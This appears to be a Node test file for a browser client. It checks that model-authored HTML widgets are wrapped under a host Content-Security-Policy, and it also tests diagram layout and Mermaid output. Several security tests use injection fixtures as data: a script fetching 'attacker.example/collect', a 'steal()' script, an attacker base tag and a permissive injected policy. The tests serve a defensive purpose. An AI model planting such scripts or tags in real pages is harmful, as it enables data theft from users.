import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import test from 'node:test'

/**
 * Evaluate the browser bundle far enough to reach its pure helpers.
 *
 * The module only registers a factory, so nothing runs until a fake loader is asked for
 * it: no DOM, no React and no plugin activation is involved.
 */
function loadClientModule() {
  const source = readFileSync(new URL('../lib/client.js', import.meta.url), 'utf8')
  let factory
  const window = { __ModuleLoader__: { load(entry) { factory = entry.factory } } }
  const document = {
    documentElement: { lang: 'en' },
    querySelectorAll: () => [],
    createElement: () => ({ style: {}, appendChild() {}, remove() {} }),
    addEventListener() {},
    removeEventListener() {},
  }
  const navigate = new Function('window', 'document', 'navigator', 'localStorage', source)
  navigate(window, document, { language: 'en', userActivation: { isActive: false } }, {
    getItem: () => null,
    setItem() {},
    removeItem() {},
  })
  assert.equal(typeof factory, 'function', 'the bundle registers one factory')
  const fakeRequire = () => ({
    createElement: () => null,
    useState: () => [null, () => {}],
    useEffect() {},
    useMemo: (compute) => compute(),
    useRef: () => ({ current: null }),
    useCallback: (fn) => fn,
    createContext: () => ({ Provider: null }),
    useContext: () => ({}),
    Fragment: null,
  })
  return factory(fakeRequire)
}

const client = loadClientModule()
const { widgetDocument, WIDGET_CSP } = client.__test
const THEME = { bg: '#fff', text: '#111' }

test('the widget policy is emitted before any model-authored script', () => {
  const html = widgetDocument(`<!doctype html>
<html>
<head>
  <script>fetch('https://attacker.example/collect')</script>
</head>
<body><p>hello</p></body>
</html>`, 'nonce-1', THEME, 'user')

  const policy = html.indexOf('Content-Security-Policy')
  const modelScript = html.indexOf("fetch('https://attacker.example/collect')")
  assert.ok(policy >= 0, 'the policy is present')
  assert.ok(modelScript >= 0, 'the model script survived as content')
  assert.ok(policy < modelScript, 'the policy precedes the model script')
  // The Host bridge is the only script the Host itself emits, and it comes first too.
  assert.ok(html.indexOf('<script>') < modelScript)
  assert.ok(html.startsWith('<!doctype html>'), 'the Host owns the document shell')
})

test('a model document cannot smuggle tags ahead of the policy', () => {
  const html = widgetDocument(`<script>steal()</script><html><head><title>x</title></head><body>ok</body></html>`, 'n2', THEME, 'user')
  const policy = html.indexOf('Content-Security-Policy')
  assert.ok(policy >= 0)
  assert.ok(policy < html.indexOf('steal()'), 'a script written before <head> still lands after the policy')
  assert.equal(html.match(/<html/gu).length, 1, 'the Host emits the only html tag')
  assert.equal(html.match(/<head/gu).length, 1, 'the Host emits the only head tag')
  assert.equal(html.match(/<body/gu).length, 1, 'the Host emits the only body tag')
})

test('a model-supplied policy or base tag is removed', () => {
  const html = widgetDocument(`<html><head>
    <base href="https://attacker.example/">
    <meta http-equiv="Content-Security-Policy" content="default-src *">
  </head><body>ok</body></html>`, 'n3', THEME, 'user')
  assert.equal(html.match(/Content-Security-Policy/gu).length, 1, 'only the Host policy remains')
  assert.equal(html.includes('default-src *'), false, 'the model policy is gone')
  assert.equal(/<base\b/iu.test(html), false, 'a model base tag is gone')
  assert.ok(html.includes(WIDGET_CSP))
})

test('a fragment is wrapped in the same Host shell', () => {
  const html = widgetDocument('<div id="x">hi</div>', 'n4', THEME, 'user')
  assert.ok(html.startsWith('<!doctype html>'))
  assert.ok(html.indexOf('Content-Security-Policy') < html.indexOf('<div id="x">hi</div>'))
  assert.ok(html.includes('<body><div id="x">hi</div></body>'))
})

test('the widget bridge requires activation unless the node opted into programmatic', () => {
  const user = client.__test.widgetBridge('n5', 'user')
  const programmatic = client.__test.widgetBridge('n5', 'programmatic')
  assert.match(user, /var policy="user"/u)
  assert.match(user, /ua!==undefined&&ua\.isActive===true/u, 'the bridge fails closed')
  assert.match(programmatic, /var policy="programmatic"/u)
})

const { textWidth, fitText, layoutTree, layoutQuadrant, layoutFunnel, layoutVenn, layoutSwimlane, toMermaid } = client.__test

test('text width estimates CJK wider than Latin, and fitText only trims what overflows', () => {
  assert.ok(textWidth('部署', 12) > textWidth('ab', 12), 'CJK runs near one em per glyph')
  assert.equal(fitText('short', 200, 12), 'short')
  const trimmed = fitText('a very long label that cannot fit', 80, 12)
  assert.ok(trimmed.endsWith('…'))
  assert.ok(textWidth(trimmed, 12) <= 80)
})

test('a tree centres each parent over its children and sizes boxes to labels', () => {
  const layout = layoutTree({
    label: 'Root',
    children: [
      { label: 'A much longer child label', children: [{ label: 'Leaf' }] },
      { label: 'B' },
    ],
  })
  assert.equal(layout.nodes.length, 4)
  const root = layout.nodes[0]
  const children = layout.nodes.filter((entry) => entry.depth === 1)
  const centre = (entry) => entry.x + entry.width / 2
  const spanCentre = (children[0].x + children[1].x + children[1].width) / 2
  assert.ok(Math.abs(centre(root) - spanCentre) < 0.001)
  assert.ok(layout.nodes[1].width > layout.nodes[2].width, 'a longer label gets a wider box')
  assert.ok(layout.width >= Math.max(...layout.nodes.map((entry) => entry.x + entry.width)))
})

test('a quadrant maps (0,0) to the bottom-left of the plot', () => {
  const layout = layoutQuadrant({ items: [{ label: 'low', x: 0, y: 0 }, { label: 'high', x: 1, y: 1 }] })
  const [low, high] = layout.items
  assert.ok(low.x < layout.cx && low.y > layout.cy)
  assert.ok(high.x > layout.cx && high.y < layout.cy)
  assert.ok(low.y <= layout.plot.y + layout.plot.h + 0.001)
})

test('a funnel narrows from the first stage to the last', () => {
  const layout = layoutFunnel([{ label: 'Visits', value: 100 }, { label: 'Signups', value: 10 }])
  assert.ok(layout.bands[0].top > layout.bands[1].top)
  assert.ok(layout.bands[1].bottom <= layout.bands[1].top)
})

test('a venn places one circle per set and keeps labels inside the frame', () => {
  const two = layoutVenn([{ label: 'A' }, { label: 'B' }])
  assert.equal(two.circles.length, 2)
  for (const label of two.labels) {
    assert.ok(label.x > 0 && label.x < two.width)
    assert.ok(label.y > 0 && label.y < two.height)
  }
  const three = layoutVenn([{ label: 'A' }, { label: 'B' }, { label: 'C' }])
  assert.equal(three.circles.length, 3)
  assert.equal(new Set(three.circles.map((circle) => circle.cy)).size, 2, 'two rows: one above, two below')
})

test('a swimlane puts step n in column n and on its lane row', () => {
  const layout = layoutSwimlane(['Customer', 'Support'], [{ lane: 0, label: 'Report' }, { lane: 1, label: 'Triage' }])
  const [first, second] = layout.boxes
  assert.ok(first.x < second.x, 'steps advance left to right')
  assert.ok(first.y < second.y, 'a lower lane sits below')
  assert.equal(layout.width, 96 + 2 * 156 + 10)
})

test('the engine-backed kinds emit their own grammar', () => {
  assert.match(toMermaid({
    kind: 'state',
    nodes: [{ id: 'idle', label: 'Idle' }, { id: 'done', label: 'Done' }],
    edges: [{ from: 'idle', to: 'done', label: 'finish' }],
    initial: 'idle',
    final: ['done'],
  }), /^stateDiagram-v2\n {2}state "Idle" as s0\n {2}state "Done" as s1\n {2}\[\*\] --> s0\n {2}s0 --> s1 : finish\n {2}s1 --> \[\*\]$/)

  assert.match(toMermaid({
    kind: 'er',
    entities: [{ name: 'User', fields: [{ name: 'id', type: 'int', key: 'PK' }] }, { name: 'Order' }],
    relations: [{ from: 'User', to: 'Order', label: 'places' }],
  }), /^erDiagram\n {2}User \{\n {4}int id PK\n {2}\}\n {2}Order\n {2}User \|\|--o\{ Order : "places"$/)

  assert.match(toMermaid({
    kind: 'gantt',
    tasks: [{ name: 'Design', start: '2026-01-01', end: '2026-01-10', section: 'Phase 1' }],
  }), /^gantt\n {2}dateFormat YYYY-MM-DD\n {2}axisFormat %m-%d\n {2}section Phase 1\n {2}Design :t1, 2026-01-01, 2026-01-10$/)

  assert.match(toMermaid({
    kind: 'mindmap',
    root: { label: 'Root', children: [{ label: 'Child (one)' }] },
  }), /^mindmap\n {2}Root\n {4}Child one$/)
})

test('the fence parser accepts every diagram kind the skill documents', () => {
  const { parseView } = client.__test
  const cases = {
    quadrant: { xAxis: ['lo', 'hi'], yAxis: ['lo', 'hi'], items: [{ label: 'a', x: 0.2, y: 0.8, tone: 'accent' }] },
    tree: { root: { label: 'root', children: [{ label: 'leaf' }] } },
    funnel: { items: [{ label: 'a', value: 10 }, { label: 'b', value: 4 }] },
    venn: { sets: [{ label: 'a' }, { label: 'b' }], center: 'both' },
    swimlane: { lanes: ['one', 'two'], steps: [{ lane: 0, label: 'a' }, { lane: 1, label: 'b' }] },
    state: { nodes: [{ id: 'a', label: 'A' }], edges: [], initial: 'a' },
    er: { entities: [{ name: 'User', fields: [{ name: 'id', type: 'int', key: 'PK' }] }] },
    gantt: { tasks: [{ name: 'Design', start: '2026-01-01', end: '2026-01-09' }] },
    mindmap: { root: { label: 'root', children: [{ label: 'branch' }] } },
  }
  for (const [kind, body] of Object.entries(cases)) {
    const view = parseView(JSON.stringify({ items: [{ type: 'diagram', kind, ...body }] }))
    assert.ok(view, `${kind} parses`)
    assert.equal(view.items[0].kind, kind, `${kind} keeps its kind`)
  }
})

test('the fence parser carries the legend and rejects a point outside the quadrant', () => {
  const { parseView } = client.__test
  const view = parseView(JSON.stringify({
    items: [{
      type: 'diagram',
      kind: 'quadrant',
      legend: [{ label: 'Focal', tone: 'accent' }, { label: 'Other', tone: 'neon' }],
      items: [{ label: 'in', x: 0.3, y: 0.3 }, { label: 'out', x: 4, y: 0.3 }],
    }],
  }))
  assert.deepEqual(view.items[0].legend, [{ label: 'Focal', tone: 'accent' }, { label: 'Other', tone: undefined }])
  assert.equal(view.items[0].items.length, 2, 'the parser clamps rather than dropping, like the rest of the client')
  assert.equal(view.items[0].items[1].x, 1)
})

test('flowchart labels are quoted, so parentheses and brackets cannot end them', () => {
  const source = toMermaid({
    kind: 'flowchart',
    nodes: [
      { id: 'a', label: '调用 get_current_lock_id()' },
      { id: 'b', label: '读缓存里的 WOPI 锁', shape: 'diamond' },
      { id: 'c', label: 'list[int]', shape: 'round' },
    ],
    edges: [{ from: 'a', to: 'b', label: '命中 (cache)' }],
  })
  assert.match(source, /n0\["调用 get_current_lock_id\(\)"\]/)
  assert.match(source, /n1\{"读缓存里的 WOPI 锁"\}/)
  assert.match(source, /n2\("list\[int\]"\)/)
  assert.match(source, /n0 -->\|"命中 \(cache\)"\| n1/)
})

test('a sub-label keeps its line break inside the quoted label', () => {
  const source = toMermaid({ kind: 'flowchart', nodes: [{ id: 'a', label: 'fn()', sub: '读锁' }], edges: [] })
  assert.match(source, /n0\["fn\(\)<br\/>读锁"\]/)
})

test('a quote becomes an apostrophe instead of a literal entity', () => {
  const source = toMermaid({ kind: 'flowchart', nodes: [{ id: 'a', label: 'say "hi"' }], edges: [] })
  assert.match(source, /n0\["say 'hi'"\]/)
  assert.doesNotMatch(source, /#quot;/)
})

test('a gantt name cannot truncate itself at a colon', () => {
  const source = toMermaid({ kind: 'gantt', tasks: [{ name: 'Design: v2', start: '2026-01-01', end: '2026-01-05', section: 'Phase: 1' }] })
  assert.match(source, /section Phase： 1/)
  assert.match(source, /Design： v2 :t1, 2026-01-01, 2026-01-05/)
})
